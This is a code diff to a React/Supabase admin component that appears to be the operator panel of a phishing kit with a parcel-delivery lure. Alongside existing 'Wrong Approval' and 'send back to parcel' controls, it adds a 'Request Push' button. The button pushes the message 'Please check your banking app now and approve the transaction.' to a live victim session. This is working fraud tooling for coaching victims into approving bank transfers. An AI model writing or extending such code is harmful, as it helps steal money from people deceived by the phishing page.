@@ -10,6 +10,7 @@ import {
   MessageSquare,
   XCircle,
   Copy,
+  Bell,
 } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 import { toast } from "@/hooks/use-toast";
@@ -111,6 +112,17 @@ export function ClientRow({ session, isSelected = false, onToggleSelect }: Clien
       })
       .eq("id", session.id);
     toast({ title: "Wrong Approval" });
+  };
+
+  const sendPushRequest = async () => {
+    await supabase
+      .from("client_sessions")
+      .update({ 
+        admin_message: "Please check your banking app now and approve the transaction.",
+        message_type: "info"
+      })
+      .eq("id", session.id);
+    toast({ title: "Push sent" });
   };
 
   const sendBackToParcel = async () => {
@@ -300,6 +312,15 @@ export function ClientRow({ session, isSelected = false, onToggleSelect }: Clien
           onClick={sendWrongApprovalMessage}
         >
           Wrong Approval
+        </Button>
+
+        <Button 
+          size="sm" 
+          variant="outline" 
+          className="h-7 text-xs text-blue-600 border-blue-300 hover:bg-blue-50" 
+          onClick={sendPushRequest}
+        >
+          <Bell className="w-3 h-3 mr-1" /> Request Push
         </Button>
 
         {session.admin_message && (
